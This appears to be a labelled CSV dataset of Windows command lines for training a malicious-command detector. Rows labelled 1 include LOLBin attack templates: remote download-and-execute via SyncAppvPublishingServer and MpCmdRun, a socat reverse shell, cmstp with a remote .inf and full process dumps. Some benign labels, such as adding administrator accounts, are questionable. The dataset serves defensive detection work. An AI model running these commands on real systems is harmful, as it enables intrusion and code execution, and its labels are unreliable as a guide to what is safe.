Command,Label
"AppVLP.exe powershell.exe -c ""$e=New-Object -ComObject shell.application;$e.ShellExecute('{PATH:.exe}','', '', 'open', 1)""",1
"forfiles /p c:\windows\system32 /m notepad.exe /c ""{CMD}""",1
diskshadow/add/expose 8f6bd2e8-c4bc-4ccf-85c8-b0975dc665a7 {E | <share> | <mountpoint>},0
"del ""D:\Logs\Users\uvrobffq.exe"" /f /q",0
systeminfo.exe,0
add volume <volume> [provider 99a81c7d-1469-461f-a8bd-b08434291288],0
C:\Windows\System32\tasklist.exe /v,0
"create lun stripe [size=825] [drives=<n, n> [,...]]  [stripesize=825] [noerr]",0
"fsutil.exe file layout ""C:\Program Files\tcneeuf.txt""",0
"echo %DATE% %TIME% >> ""C:\Users\ejyit\Documents\Downloads\zrrpwwoju.log""",0
"echo.exe %DATE% %TIME% >> ""D:\Windows\ffyxg.ini""",0
"dir.exe ""C:\Logs\Program Files""",0
"copy ""D:\AppData\AppData\eytjvq.ini"" ""C:\AppData\Logs\tcybo.dll""",0
"powershell.exe -Command ""Get-ChildItem -Path C:\AppData\Temp -Recurse | Select-Object FullName, Length""",0
whoami.exe /all,0
net localgroup Administrators zmhdugpr /add,0
"del ""C:\Temp\Logs\nndlrd.txt"" /f /q",0
systeminfo.exe,0
"findstr.exe /C:""4ZSxemQsIWhz"" ""C:\Logs\Logs\wcozvcctd.ini""",0
pcalua.exe -a {PATH:.exe},1
net user wyekpbfn /add,0
DumpMinitool.exe --file {PATH_ABSOLUTE} --processId 1132 --dumpType Full,1
"schtasks /create /tn ""My Daily Backup"" /tr ""C:\Windows\System32\copy.exe \""D:\Users\wrnutx.sys\"" \""C:\Users\ljmzhpz\Documents\Pictures\fpvmfen.dat\"""" /sc daily /st 23:00",0
ping 192.168.138.28,0
"copy.exe ""D:\Program Files\zbickywc.sys"" ""C:\Windows\Users\rsindzon.dat""",0
"certutil.exe -hashfile ""D:\Windows\AppData\rantbxppx.txt"" SHA256",0
ipconfig.exe /all,0
C:\Windows\net.exe use Z: \\192.168.147.93\backup,0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\AppData\xuvlv.dll\"" \""C:\Logs\ouuruxhq.log\"""" /sc daily /st 23:00",0
"dir.exe ""C:\Users\phqltrjq\Desktop"" /s /b",0
net.exe use Z: \\192.168.190.123\public,0
"systeminfo | findstr.exe /B /C:""OS Name"" /C:""OS Version""",0
C:\Windows\net.exe localgroup Administrators user1 /add,0
"echo %DATE% %TIME% >> ""D:\Users\oljt\Pictures\Pictures\mzqde.dll""",0
"C:\Windows\System32\at.exe 09:00 /interactive /every:m,t,w,th,f,s,su {CMD}",1
"C:\Windows\certutil.exe -hashfile ""D:\Users\edseysiqnb.log"" SHA256",0
net localgroup Administrators cuojuiro /add,0
"type ""D:\AppData\Temp\tkrtjkqoe.sys""",0
"C:\Program Files\powershell.exe -Command ""Get-Process""",0
"type ""C:\Users\klfeernbxb.ini""",0
#pragma add_TRAP_DEST <communityname> <hostID>,0
net.exe use Z: \\192.168.163.54\public,0
"type ""D:\Windows\Temp\lopoat.sys""",0
"rmdir.exe ""D:\Users\wmnd\Downloads"" /s /q",0
"dir ""C:\Users\AppData""",0
"fsutil.exe file layout ""C:\Temp\qvtxlt.sys""",0
echo.exe 7IOcLw5z940p > D:\Windows\bkuzuz.sys,0
C:\Program Files\arp.exe -a,0
"del ""C:\Users\Logs\poops.dll"" /f /q",0
"fsutil.exe file layout ""C:\Logs\ylheyv.ini""",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Users\fsbrrraqc.exe\"" \""C:\Logs\sclox.ini\"""" /sc daily /st 23:00",0
C:\Windows\System32\netsh.exe advfirewall show allprofiles,0
net.exe use Z: \\192.168.207.14\backup,0
echo.exe Y3KFh4XExSU6 > D:\AppData\Users\alzurkx.dat,0
echo.exe aJsUuNJLKPNk > D:\Logs\Windows\hoesmcrc.log,0
"fsutil.exe file layout ""C:\AppData\ktkwe.dat""",0
net use Z: \\192.168.65.99\data,0
"copy ""C:\Temp\Users\cjcxmvv.log"" ""C:\Logs\Windows\crcomd.log""",0
"D:\Windows\rmdir.exe ""D:\Users\krdgp\Pictures"" /s /q",0
fondue.exe /enable-feature:<feature_name> [/caller-name:<program_name>] [/hide-ux:{all | rebootrequest}],0
netstat.exe -an,0
"attrib.exe +h ""C:\Windows\wftqtbi.dll""",0
"type.exe ""D:\Logs\qxlhbcf.dat""",0
"certutil -hashfile ""D:\AppData\tppcjj.exe"" SHA256",0
systeminfo.exe,0
ping.exe 192.168.74.95,0
ping 192.168.143.145,0
net.exe user sbnateic /add,0
"icacls.exe ""D:\Windows\uydiv.dat"" /grant Everyone:F",0
icacls.exe data.log /grant Everyone:R,0
"del ""D:\Logs\gdaqurnei.sys"" /f /q",0
MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}:evil.exe,1
net.exe user nkhwrapb /add,0
net.exe localgroup Administrators rhxfwsoj /add,0
whoami.exe /all,0
"attrib +h ""D:\Users\nzom\Documents\Documents\dqkxkpxjuq.dll""",0
add volume <volume> [provider 9c6ff52c-f659-47c7-9c4e-08d1d9479a4c],0
echo ZO62MFOSspqv > D:\AppData\Users\ncvewh.exe,0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Program Files\sedsuiqgt.dll\"" \""C:\AppData\Windows\nzpopxau.exe\"""" /sc daily /st 23:00",0
"fsutil file layout ""D:\Users\bphz\Desktop\gjuwvlmynk.exe""",0
"findstr /C:""yHCRviF4pKdS"" ""C:\Users\kbkm\Documents\qiqitm.exe""",0
"certutil.exe -hashfile ""D:\AppData\bjljfekhlz.ini"" SHA256",0
C:\Windows\net.exe user hfzavbmr /add,0
net localgroup Administrators gvfehtjb /add,0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Users\otahw\Documents\ewghhe.log\"" \""D:\Users\Temp\fgjgtpme.exe\"""" /sc daily /st 23:00",0
fsutil.exe volume [dismount] C:\Users\blotjmt\Pictures,0
echo HYnbYvZDQoq2 > D:\Logs\wswnsmirb.ini,0
mshta.exe {PATH:.hta},1
"mkdir ""D:\Temp""",0
net user hlmmwupj /add,0
"findstr.exe /C:""bnFbwzJtTKL7"" ""D:\Windows\Windows\mjfwlbpy.sys""",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Users\Logs\hpccpww.ini\"" \""D:\Windows\vpcbsmrl.exe\"""" /sc daily /st 23:00",0
ping.exe 192.168.45.75,0
"fsutil.exe file layout ""C:\Windows\Windows\fuzgskbkzg.dll""",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Temp\zfpmsviugs.log\"" \""D:\Program Files\Logs\kduxswvyp.exe\"""" /sc daily /st 23:00",0
"fsutil file layout ""C:\Users\unjvs\Downloads\Downloads\hmzfaaro.exe""",0
"certutil -hashfile ""C:\Windows\arlip.txt"" SHA256",0
"C:\Windows\type.exe ""D:\Temp\kyprposyx.sys""",0
net localgroup Administrators syscvpvr /add,0
"bash.exe -c ""socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane""",1
"certutil.exe -hashfile ""C:\Windows\yirhuqlc.log"" SHA256",0
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Users\Logs\umbdp.ini\"" \""C:\AppData\tiudnmm.ini\"""" /sc daily /st 23:00",0
tasklist.exe /v,0
"rundll32.exe zipfldr.dll,RouteTheCall file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e",1
pixtool.exe launch {PATH_ABSOLUTE:.exe},1
"findstr.exe /C:""67ibOei17Fak"" ""C:\Users\Program Files\nftcqa.log""",0
echo.exe UCeZett1RRA1 > D:\AppData\Temp\owbxolnztg.log,0
"C:\Windows\echo.exe %DATE% %TIME% >> ""D:\Temp\bnwsgxjeu.dll""",0
icacls.exe data.log /grant Everyone:R,0
"del ""D:\Users\wasueluj\Downloads\xlmiqsf.dat"" /f /q",0
net user nywbcfwr /add,0
"move ""D:\Users\rijuhao\Pictures\Pictures\acbolkksqh.exe"" ""D:\Logs\cfykzbykp.exe""",0
echo BGYy8oQgSDue > D:\Temp\whdiqpgw.sys,0
"set windir=c:\test& cd ""C:\Program Files\Internet Explorer\"" & iediagcmd.exe /out:{PATH_ABSOLUTE:.cab}",1
net localgroup Administrators spnozkkr /add,0
"schtasks /create /tn ""My Daily Backup"" /tr ""C:\Windows\copy.exe \""D:\Temp\Windows\eczudjn.ini\"" \""D:\Program Files\Users\lqjqxeje.dat\"""" /sc daily /st 23:00",0
"move ""C:\Windows\jadvcquyj.ini"" ""C:\Users\fqhxnjp\Pictures\ujwfjgs.sys""",0
C:\Program Files (x86)\reg.exe query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion,0
"attrib +h ""D:\Windows\Windows\itadydvnk.exe""",0
erase [/p] [/f] [/s] [/q] [/a[:]<attributes>] <names>,0
"type ""D:\Logs\Program Files\xikpayfsb.log""",0
"dir.exe ""D:\Temp\AppData"" /s /b",0
netstat.exe -an,0
"certutil -hashfile ""C:\Users\lawdl.dat"" SHA256",0
C:\Windows\System32\whoami.exe /all,0
echo.exe C5iAYTjAVYQc > C:\Temp\AppData\yyztdnfoap.log,0
"C:\Windows\System32\attrib.exe +h ""D:\AppData\Logs\exsydo.log""",0
"icacls.exe ""D:\Windows\Windows\bncxdjzyma.dat"" /grant Everyone:F",0
expand vdisk maximum=<n>,0
"certutil.exe -hashfile ""D:\Windows\Users\etkcrosk.ini"" SHA256",0
"type.exe ""C:\AppData\fblyaalit.dll""",0
"certutil -hashfile ""D:\Temp\uwiyuf.log"" SHA256",0
"C:\Windows\System32\mkdir.exe ""D:\AppData\Temp""",0
echo.exe ovmdj0rHNjwJ > C:\Program Files\zaxwewrhn.dat,0
"C:\Windows\System32\echo.exe %DATE% %TIME% >> ""D:\Logs\zaxhzfeu.log""",0
netstat.exe -an,0
ping 192.168.254.25,0
"echo %DATE% %TIME% >> ""D:\Temp\shnned.exe""",0
net.exe localgroup Administrators aqrjvayc /add,0
net.exe localgroup Administrators hdzjesxl /add,0
echo.exe 8J7Og2UQIO5I > C:\Windows\ycmmmls.ini,0
"""C:\pstools\psexec.exe"" {REDACTED} -s cmd /c ""cmd.exe /c netsh
interface portproxy delete v4tov4 listenaddress=0.0.0.0
listenport=9999",1
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""D:\Temp\rzjrze.log\"" \""C:\AppData\ymbosb.txt\"""" /sc daily /st 23:00",0
"move.exe ""D:\AppData\fapfej.dll"" ""C:\Windows\AppData\xkqkhgvk.dat""",0
C:\Windows\System32\net.exe use Z: \\192.168.132.155\public,0
SettingSyncHost -LoadAndRunDiagScript {PATH:.exe},1
wscript //e:vbscript {PATH}:script.vbs,1
"del ""D:\Users\hgcysrg\Desktop\Pictures\dmxecjnoft.dat"" /f /q",0
"fsutil file layout ""C:\Windows\rvqlubkk.exe""",0
"del ""D:\Logs\AppData\dzlfna.dat"" /f /q",0
fsutil 8dot3name [set] { <defaultvalue> | C:\Users\smpoi\Downloads {1|0}},0
Excel.exe {REMOTEURL},1
"rmdir ""D:\Users\Program Files"" /s /q",0
"icacls ""D:\AppData\jcsxjr.exe"" /grant Everyone:F",0
"dir.exe ""D:\Windows\AppData"" /s /b",0
"C:\Windows\System32\dir.exe ""C:\AppData\AppData""",0
"C:\Windows\powershell.exe -Command ""Get-Service""",0
ping.exe 192.168.1.1,0
ping 192.168.84.17,0
net.exe localgroup Administrators crakhiwn /add,0
net.exe localgroup Administrators sgdhddzy /add,0
net.exe user ifpdbhgf /add,0
"type ""D:\Logs\maxlnmh.sys""",0
attrib.exe +r config.ini,0
fsutil.exe 8dot3name [scan] [/s] [/l [<log file>] ] [/v] C:\Logs,0
C:\Windows\net.exe localgroup Administrators oimwnsgy /add,0
net.exe use Z: \\192.168.56.16\backup,0
net.exe user mguhhgfk /add,0
"findstr /C:""N6XpLl2fNgai"" ""D:\Users\cjdnejtzly.ini""",0
"del ""C:\AppData\Users\xamoefygcd.dat"" /f /q",0
"SyncAppvPublishingServer.exe ""n;(New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX""",1
"move.exe ""D:\Logs\Logs\uzhomivz.log"" ""D:\Program Files\nghwhsml.sys""",0
"del ""D:\Windows\Windows\xggkviyig.log"" /f /q",0
"move.exe ""C:\Program Files\ddjduppkff.ini"" ""D:\Program Files\xhnzwmucbn.ini""",0
"move ""C:\Users\ektjzkv\Desktop\Desktop\pkiga.sys"" ""C:\Users\lhtpcjpmhq.sys""",0
echo.exe 7tDIYDoYytsd > D:\Users\gyaoxp\Desktop\Pictures\ortmf.dat,0
net.exe localgroup Administrators fwcrdwmz /add,0
net localgroup Administrators vcnyybvu /add,0
cmstp.exe /ni /s {REMOTEURL:.inf},1
tasklist.exe /v,0
"attrib +h ""D:\Temp\yzxttd.txt""",0
net localgroup Administrators gjdawbee /add,0
"fsutil file layout ""C:\Users\dxoxaqi\Documents\otzvrodnxw.txt""",0
net.exe localgroup Administrators ggeblinj /add,0
"copy ""C:\Users\vqert.dat"" ""D:\Temp\otypeypdjs.dat""",0
ping.exe 192.168.51.58,0
"attrib.exe +h ""C:\Windows\Users\psckwhwgfv.dll""",0
